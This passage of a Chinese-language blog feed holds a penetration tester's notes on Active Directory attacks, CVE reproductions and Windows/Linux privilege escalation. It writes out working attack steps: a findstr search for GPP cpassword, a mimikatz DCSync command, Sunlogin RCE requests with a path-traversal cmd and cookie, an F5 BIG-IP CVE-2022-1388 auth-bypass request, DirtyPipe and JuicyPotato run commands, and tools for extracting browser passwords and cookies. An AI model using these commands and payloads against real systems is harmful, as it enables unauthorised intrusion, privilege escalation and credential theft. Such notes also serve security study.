title="原理"></a>原理</h3><p>存在没有打补丁的winserver2008上，超过2008版本的系统是没办法写入密码的。</p><p>产生原因：使用了GPP功能，如果输入了用户的密码的话，那么密码就会以AES 256加密的形式存储在SYSVOL文件夹下的以XML后缀结尾的xml文件中，这个密码的加密密钥由微软官方给出可以进行解密。</p><p>但是如果打补丁或者高版本的话，GPP服务是不能输入密码的了，这个漏洞也就相应不存在了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr &#x2F;S &#x2F;I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br></pre></td></tr></table></figure><p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p><p><a href="https://3gstudent.github.io/">https://3gstudent.github.io/</a></p><h1 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm-relay"></a>ntlm-relay</h1><h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p><a href="https://cloud.tencent.com/developer/article/1899592">域渗透之委派攻击详解（非约束委派/约束委派/资源委派） - 云+社区 - 腾讯云 (tencent.com)</a></p><p><a href="https://mp.weixin.qq.com/s/uKe-qAJiXqOQVhiAWB43qg">委派攻击 (qq.com)</a></p><p>只有服务账号/机器账号才能设置委派</p><h3 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h3><h3 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h3><h3 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h3><p>参考：<a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p><p><a href="https://mp.weixin.qq.com/s/WyFeKkmzIjqcbP5uciDW6Q">https://mp.weixin.qq.com/s/WyFeKkmzIjqcbP5uciDW6Q</a></p><h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><p>域控独特端口：ladp 389</p><h3 id="域内漏洞"><a href="#域内漏洞" class="headerlink" title="域内漏洞"></a>域内漏洞</h3><p>CVE-2019-1040（攻击使得攻击者在仅有一个普通域账号的情况下可以远程控制Windows域内的任何机器，包括域控服务器。）</p><p>ZeroLogon(CVE-2020-1472)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者可以向域发起Netlogon 计算机账户认证请求, 使用8字节全0 client challenge 不断尝试得到一个正确的8字节全0 client credential 通过认证，再通过相关调用完成对域控密码的修改。</span><br></pre></td></tr></table></figure><p>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</p><h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><p>CVE-2021-1675 Windows Print Spooler权限提升漏洞复现</p><p>17010</p><p>CVE-2020-0796(永恒之黑)</p><h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><p>原理即域控自己数据同步，同步NTDS.dit</p><ul><li>需要获得以下任一用户的权限：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Administrators组内的用户</span><br><span class="line">Domain Admins组内的用户</span><br><span class="line">Enterprise Admins组内的用户</span><br><span class="line">域控制器的计算机帐户</span><br><span class="line">exchange trusted subsystem组内账户&#96; (需要写ACL)&#96; 暂时不会</span><br></pre></td></tr></table></figure><ol><li><p>pth/ptt/runas</p></li><li><p>mimikatz：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:xxxx.org &#x2F;all &#x2F;csv&quot; exit</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>secretsdump</strong>+ ntds.dit</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="维权"><a href="#维权" class="headerlink" title="维权"></a>维权</h3>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;组策略&quot;&gt;&lt;a href=&quot;#组策略&quot; class=&quot;headerlink&quot; title=&quot;组策略&quot;&gt;&lt;/a&gt;组策略&lt;/h1&gt;&lt;h3 id=&quot;本地组策略-LGP&quot;&gt;&lt;a href=&quot;#本地组策略-LGP&quot; class=&quot;headerlink&quot; title=&quot;本地组策略 LGP&quot;&gt;&lt;/a&gt;本地组策略 LGP&lt;/h3&gt;&lt;p&gt;简称（Local Group Policy或者Local GPO）&lt;/p&gt;
&lt;p&gt;win+R键打开运行，输入“gpedit.msc”&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220303233218371.png&quot; alt=&quot;image-20220303233218371&quot;&gt;&lt;/p&gt;
&lt;p&gt;添加对应脚本即可&lt;/p&gt;
&lt;p&gt;或者将文件直接放入C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup   路径下  （可以开机自启）&lt;/p&gt;
&lt;p&gt;通常用来&lt;code&gt;权限维持&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="内网" scheme="http://example.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="AD域的攻击方式" scheme="http://example.com/tags/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>CVE复现</title>
    <link href="http://example.com/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-02-26T10:41:45.000Z</published>
    <updated>2022-05-25T09:23:47.590Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="向日葵远程代码执行"><a href="#向日葵远程代码执行" class="headerlink" title="向日葵远程代码执行"></a>向日葵远程代码执行</h3><h5 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h5><p><strong>向日葵远程控制</strong>是一款免费的集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。</p><p>（CNVD-2022-10270/CNVD-2022-03672），影响Windows系统使用的个人版和简约版。 该漏洞发生在接口``/check`处，</p><p>此漏洞端口一般大于40000</p><a id="more"></a><h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">11.1.1</span><br><span class="line"></span><br><span class="line">10.3.0.27372</span><br><span class="line"></span><br><span class="line">11.0.0.33162      （不一定准确）</span><br></pre></td></tr></table></figure><h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><blockquote><p>手工测试：</p></blockquote><p>首先我们要确定目标端口(扫描开放端口，一般在 40000以上)，然后访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.102:49414&#x2F;</span><br></pre></td></tr></table></figure><p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320225345974.png" alt="image-20220320225345974"></p><p>获取token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.102:49414&#x2F;cgi-bin&#x2F;rpc?action&#x3D;verify-haras</span><br></pre></td></tr></table></figure><p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320225428763.png" alt="image-20220320225428763"></p><p>“verify_string” 的值会刷新改变，但这个下面我们和CID:组成cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check?cmd&#x3D;ping..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;ipconfig</span><br><span class="line"></span><br><span class="line">添加  Cookie: CID&#x3D;sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1</span><br></pre></td></tr></table></figure><p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320230404045.png" alt="image-20220320230404045"></p><blockquote><p>脚本测试：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mr-xn&#x2F;sunlogin_rce</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xrkRce.exe -h 192.168.1.102 -t scan</span><br></pre></td></tr></table></figure><p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320224603734.png" alt="image-20220320224603734"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xrkRce.exe -h 192.168.1.102 -t rce -p 49414 -c &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320225054179.png" alt="image-20220320225054179"></p><p>参考：</p><p><a href="https://www.cnblogs.com/cn-gov/p/15952459.html">https://www.cnblogs.com/cn-gov/p/15952459.html</a></p><h3 id="CVE-2022-0543-Redis-Lua-沙箱绕过"><a href="#CVE-2022-0543-Redis-Lua-沙箱绕过" class="headerlink" title="CVE-2022-0543   Redis Lua 沙箱绕过"></a>CVE-2022-0543   Redis Lua 沙箱绕过</h3><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/Q3iRoVynpkUHUDo74UnXgA">https://mp.weixin.qq.com/s/Q3iRoVynpkUHUDo74UnXgA</a></p><h3 id="CVE-2022-1388-F5-BIG-IP远程代码执行漏洞"><a href="#CVE-2022-1388-F5-BIG-IP远程代码执行漏洞" class="headerlink" title="CVE-2022-1388  F5 BIG-IP远程代码执行漏洞"></a>CVE-2022-1388  F5 BIG-IP远程代码执行漏洞</h3><p>该漏洞允许未经身份验证的攻击者通过管理端口或自身 IP 地址对 BIG-IP 系统进行网络访问，以执行任意系统命令、创建或删除文件以及禁用BIG-IP上的服务。</p><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;mgmt&#x2F;tm&#x2F;util&#x2F;bash HTTP&#x2F;1.1</span><br><span class="line">Host: &lt;redacted&gt;:8443</span><br><span class="line">Authorization: Basic YWRtaW46</span><br><span class="line">Connection: keep-alive, X-F5-Auth-Token</span><br><span class="line">X-F5-Auth-Token: 0</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;: &quot;run&quot; , &quot;utilCmdArgs&quot;: &quot; -c &#39;id&#39; &quot; &#125;   ( id换成rec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://github.com/0xf4n9x/CVE-2022-1388">0xf4n9x/CVE-2022-1388：CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE (github.com)</a></p><h3 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h3><h5 id="CVE-2022-22965-Spring-Framework-RCE-Early-Announcement"><a href="#CVE-2022-22965-Spring-Framework-RCE-Early-Announcement" class="headerlink" title="CVE-2022-22965  Spring Framework RCE, Early Announcement"></a>CVE-2022-22965  Spring Framework RCE, Early Announcement</h5><p><a href="https://blog.csdn.net/weixin_45794666/article/details/123918066">(28条消息) Spring Framework RCE(CVE-2022-22965)_6right的博客-CSDN博客</a></p><h5 id="CVE-2022-22947-Spring-Cloud-Gateway"><a href="#CVE-2022-22947-Spring-Cloud-Gateway" class="headerlink" title="CVE-2022-22947   Spring Cloud Gateway"></a>CVE-2022-22947   Spring Cloud Gateway</h5><p><a href="https://www.cnblogs.com/syroot/p/15978762.html">Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947） - 三亿人 - 博客园 (cnblogs.com)</a></p><h3 id="Structs2"><a href="#Structs2" class="headerlink" title="Structs2"></a>Structs2</h3><h5 id="Structs2-026-RCE"><a href="#Structs2-026-RCE" class="headerlink" title="Structs2-026 RCE"></a>Structs2-026 RCE</h5><p>新出的 ，CVE-2021-31805</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Struts 2.0.0-2.5.29</span><br></pre></td></tr></table></figure><p><a href="https://mp.weixin.qq.com/s/B17fFD3xDYvNib6LhUS9dA">https://mp.weixin.qq.com/s/B17fFD3xDYvNib6LhUS9dA</a></p><h3 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h3><h5 id="ThinkPHP-6-0-12LTS-反序列漏洞分析"><a href="#ThinkPHP-6-0-12LTS-反序列漏洞分析" class="headerlink" title="ThinkPHP 6.0.12LTS 反序列漏洞分析"></a>ThinkPHP 6.0.12LTS 反序列漏洞分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP 6.0.12LTS(目前最新版本)；</span><br></pre></td></tr></table></figure><p><a href="https://mp.weixin.qq.com/s/xgolXMP8QkeQRH8ylm86dg">https://mp.weixin.qq.com/s/xgolXMP8QkeQRH8ylm86dg</a></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="CVE-2022-0847-Linux-本地内核提权漏洞"><a href="#CVE-2022-0847-Linux-本地内核提权漏洞" class="headerlink" title="CVE-2022-0847 Linux 本地内核提权漏洞"></a>CVE-2022-0847 Linux 本地内核提权漏洞</h3><h5 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h5><p>堪称新版脏牛。Dirty Pipe</p><p>该漏洞源于新管道缓冲区结构的“flag”变量在 Linux 内核中的 copy_page_to_iter_pipe 和 push_pipe 函数中缺乏正确初始化。非特权本地用户利用该漏洞可以提升权限至root。</p><p>允许非特权用户注入和覆盖任意只读文件中的数据，非特权用户通过替换/etc/passwd文件中root用户的hash值达到权限提升的目的。</p><p>exp 链接：<a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a></p><h5 id="适用范围："><a href="#适用范围：" class="headerlink" title="适用范围："></a>适用范围：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Linux Kernel版本 &gt;&#x3D; 5.8</span><br><span class="line"></span><br><span class="line">Linux Kernel版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102 </span><br></pre></td></tr></table></figure><h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;version    #查看linux内核版本</span><br><span class="line"></span><br><span class="line">.&#x2F;compile.sh</span><br><span class="line"></span><br><span class="line">.&#x2F;exploit</span><br></pre></td></tr></table></figure><p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220310212912716.png" alt="image-20220310212912716"></p><p>原理：<a href="https://mp.weixin.qq.com/s/cHuO8TO4IvGgslvipJGQ2A">漏洞通告：CVE-2022-0847linux内核提权漏洞复现/原理讲解 (qq.com)</a></p><p><a href="https://www.freebuf.com/company-information/324470.html">https://www.freebuf.com/company-information/324470.html</a></p><p><a href="https://zone.huoxian.cn/d/978-cve-2022-0847-dirtypipe-linux">CVE-2022-0847_DirtyPipe Linux 内核提权漏洞分析及复现 - 火线 Zone-云安全社区 (huoxian.cn)</a></p><h3 id="打印机提权漏洞"><a href="#打印机提权漏洞" class="headerlink" title="打印机提权漏洞"></a>打印机提权漏洞</h3><p>CVE-2020-1337</p><p>CVE-2020–1030 </p><p>CVE-2020–1048</p><p>CVE-2022-21999  打印机提权漏洞  </p><p>环境原因没有复现成功</p><p>参考：</p><p>原理：<a href="https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81">https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81</a></p><p>poc：<a href="https://github.com/ly4k/SpoolFool">https://github.com/ly4k/SpoolFool</a></p><h3 id="CVE-2022–26923Active-Directory-域权限提升漏洞"><a href="#CVE-2022–26923Active-Directory-域权限提升漏洞" class="headerlink" title="CVE-2022–26923Active Directory 域权限提升漏洞"></a>CVE-2022–26923Active Directory 域权限提升漏洞</h3><ul><li>由于对用户属性的不正确获取，允许低权限用户在安装了 Active Directory 证书服务（AD CS）服务器角色的 Active Directory 环境中将权限提升至域管理员。</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;RCE&quot;&gt;&lt;a href=&quot;#RCE&quot; class=&quot;headerlink&quot; title=&quot;RCE&quot;&gt;&lt;/a&gt;RCE&lt;/h2&gt;&lt;h3 id=&quot;向日葵远程代码执行&quot;&gt;&lt;a href=&quot;#向日葵远程代码执行&quot; class=&quot;headerlink&quot; title=&quot;向日葵远程代码执行&quot;&gt;&lt;/a&gt;向日葵远程代码执行&lt;/h3&gt;&lt;h5 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h5&gt;&lt;p&gt;&lt;strong&gt;向日葵远程控制&lt;/strong&gt;是一款免费的集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。&lt;/p&gt;
&lt;p&gt;（CNVD-2022-10270/CNVD-2022-03672），影响Windows系统使用的个人版和简约版。 该漏洞发生在接口``/check`处，&lt;/p&gt;
&lt;p&gt;此漏洞端口一般大于40000&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="CVE" scheme="http://example.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>内网知识学习</title>
    <link href="http://example.com/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-01-23T04:57:54.000Z</published>
    <updated>2022-04-08T14:02:48.419Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="ntlm协议"><a href="#ntlm协议" class="headerlink" title="ntlm协议"></a>ntlm协议</h1><p>windows身份认证</p><p>pth基础</p><p><a href="https://www.istt.org.cn/NewsDetail/2031875.html">Windows认证原理 网络认证(进阶篇)-江苏智慧安全可信技术研究院 (istt.org.cn)</a></p><h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><p>Kerberos是一种由MIT提出的一种计算机网络授权协议，旨在通过使用加密技术为客户端/服务端应用程序提供强大的认证服务。</p><p>Kerberos 主要是用在<code>域环境下的身份认证协议</code>。</p><p><img src="/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/image-20220124122003434.png" alt="image-20220124122003434"></p><p>client              ——       TGT            ——               <strong>KDC</strong>，密钥分发中心(<strong>AS</strong>，身份验证服务,<strong>TGS</strong>，票据授权服务)</p><p>|</p><p>TGS(ticket )</p><p>|</p><p>server </p><p>tgt   黄金票据</p><p>tgs  白银票据</p><p>EnhancedGolden <strong>Tickets</strong>    增强版（子域打域控）</p><p>（权限维持）</p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/MWN5darSef0OqiT6rLk9nA">https://mp.weixin.qq.com/s/MWN5darSef0OqiT6rLk9nA</a></p><p><a href="https://mp.weixin.qq.com/s/5u2dyu1wVji8d1IxLb11DA">https://mp.weixin.qq.com/s/5u2dyu1wVji8d1IxLb11DA</a></p><p><a href="https://www.istt.org.cn/NewsDetail/2031879.html">Windows认证原理 Kerberos认证-江苏智慧安全可信技术研究院 (istt.org.cn)</a></p><p>​    </p><h1 id="解密浏览器密码工具"><a href="#解密浏览器密码工具" class="headerlink" title="解密浏览器密码工具"></a>解密浏览器密码工具</h1><p>（有杀软）本地解chrome数据库方法：<a href="https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.3.7">https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.3.7</a> </p><p>（无杀软） 直接用<a href="https://github.com/moonD4rk/HackBrowserData">hack-browser-data.exe</a>导出cookie</p><p>参考：</p><p>dozerctf2021域渗透：<a href="https://www.yuque.com/w0rkmn/lnpppa/mdie6g#f755069b">https://www.yuque.com/w0rkmn/lnpppa/mdie6g#f755069b</a></p><h1 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h1><p> 活动目录是一种目录服务：活动目录通过域控制器接受查询请求，查询活动目录数据库把域对象名字解析为对象记录</p><p>​    <code>活动目录用户</code>通过<code>LDAP协议</code>（一种进入目录服务的协议）向活动目录服务器<code>发送请求</code>，为了定位提供查询服务的域控制器就需要借助于DNS。</p><p>​    活动目录使用<code>DNS服务器</code>作为<code>定位服务器</code>，把域控制器解析为IP地址。活动目录要发挥作用，离不开DNS。</p><p>ntds.dit</p><p>ldap</p><p><a href="https://www.freebuf.com/articles/network/283763.html">内网渗透测试：内网环境与活动目录基础概念 - FreeBuf网络安全行业门户</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;ntlm协议&quot;&gt;&lt;a href=&quot;#ntlm协议&quot; class=&quot;headerlink&quot; title=&quot;ntlm协议&quot;&gt;&lt;/a&gt;ntlm协议&lt;/h1&gt;&lt;p&gt;windows身份认证&lt;/p&gt;
&lt;p&gt;pth基础&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="内网" scheme="http://example.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网知识学习" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>提权</title>
    <link href="http://example.com/2022/01/16/%E6%8F%90%E6%9D%83/"/>
    <id>http://example.com/2022/01/16/%E6%8F%90%E6%9D%83/</id>
    <published>2022-01-16T13:30:50.000Z</published>
    <updated>2022-06-06T13:11:14.229Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="windows-提权"><a href="#windows-提权" class="headerlink" title="windows 提权"></a>windows 提权</h1><hr><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>汇总：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><h5 id="提权辅助"><a href="#提权辅助" class="headerlink" title="提权辅助"></a>提权辅助</h5><p>systeminfo   查看补丁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221104049104.png" alt="image-20220221104049104"></p><p><a href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a> 寻找提权漏洞，github下载，但提权exe需要经过免杀测试 </p><p><a href="https://github.com/Ascotbe/Kernelhub">Windows提权漏洞合集</a></p><a id="more"></a><h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><ol><li>该模块能够查询安装补丁</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br></pre></td></tr></table></figure><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221103405151.png" alt="image-20220221103405151"></p><ol start="2"><li>低权限用户的session，该模块用于快速识别系统中可能被利用的漏洞，进行提权</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester </span><br></pre></td></tr></table></figure><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221112230097.png" alt="image-20220221112230097"></p><p>根据显示可利用的模块，进行提权（感觉可以）</p><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221131823569.png" alt="image-20220221131823569"></p><h3 id="bypassUAC"><a href="#bypassUAC" class="headerlink" title="bypassUAC"></a>bypassUAC</h3><p>用户帐户控制 (UAC)  允许所有用户使用标准用户帐户登录到他们的计算机。 使用标准用户令牌启动的进程可能会使用授予标准用户的访问权限执行任务。借助 UAC，应用和任务将始终在非管理员帐户的安全上下文中运行，除非管理员专门授予管理员级别的访问系统权限。 UAC 可阻止自动安装未经授权的应用并防止意外更改系统设置。</p><p>总之来说就是绕过uac限制，运行某些程序，对c盘一些重要文件进行读取和写入，安装卸载程序等</p><p>适用于：</p><ul><li>Windows 10，Windows 11，Windows Server 2016 和更高版本</li></ul><h5 id="msf-1"><a href="#msf-1" class="headerlink" title="msf:"></a>msf:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br></pre></td></tr></table></figure><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221133213351.png" alt="image-20220221133213351"></p><p>参考：<a href="https://mp.weixin.qq.com/s/vowFqYxX_x0gu2-38TEGFA">https://mp.weixin.qq.com/s/vowFqYxX_x0gu2-38TEGFA</a></p><h5 id="dll注入"><a href="#dll注入" class="headerlink" title="dll注入"></a>dll注入</h5><h5 id="白名单进程"><a href="#白名单进程" class="headerlink" title="白名单进程"></a>白名单进程</h5><h3 id="土豆家族"><a href="#土豆家族" class="headerlink" title="土豆家族"></a>土豆家族</h3><p>Juicy Potato：<a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p>原理：</p><p>实际上就是利用MS16-075漏洞进行提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;8BC3F05E-D86B-11D0-A075-00C04FB68820&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220219151053814.png" alt="image-20220219151053814"></p><p>条件：</p><ol><li>用户权限：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line"></span><br><span class="line">如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br><span class="line"></span><br><span class="line">如果均开启，可以选择-t *</span><br><span class="line">如果均未开启，那么无法提权</span><br></pre></td></tr></table></figure><ol start="2"><li>RPC 135端口是否开启</li></ol><h3 id="其他tips："><a href="#其他tips：" class="headerlink" title="其他tips："></a>其他tips：</h3><p>（CVE-2022-29072）7zip漏洞 提权</p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/66y_Pg2j9CNfxeErFczdSg">https://mp.weixin.qq.com/s/66y_Pg2j9CNfxeErFczdSg</a></p><p><a href="https://mp.weixin.qq.com/s/lmfM6VWM3YXj2vjalNerKw">https://mp.weixin.qq.com/s/lmfM6VWM3YXj2vjalNerKw</a></p><p><a href="https://blog.cfyqy.com/article/bde10ad7.html#more">https://blog.cfyqy.com/article/bde10ad7.html#more</a></p><h1 id="linux-提权"><a href="#linux-提权" class="headerlink" title="linux 提权"></a>linux 提权</h1><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a               查询内核版本</span><br><span class="line">cat &#x2F;etc&#x2F;issue         查询发行版本</span><br></pre></td></tr></table></figure><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>脏牛</p><p>Linux Polkit 权限提升(CVE-2021-4034)</p><p>Linux kernel 本地提权漏洞 cve-2022-0847</p><p><a 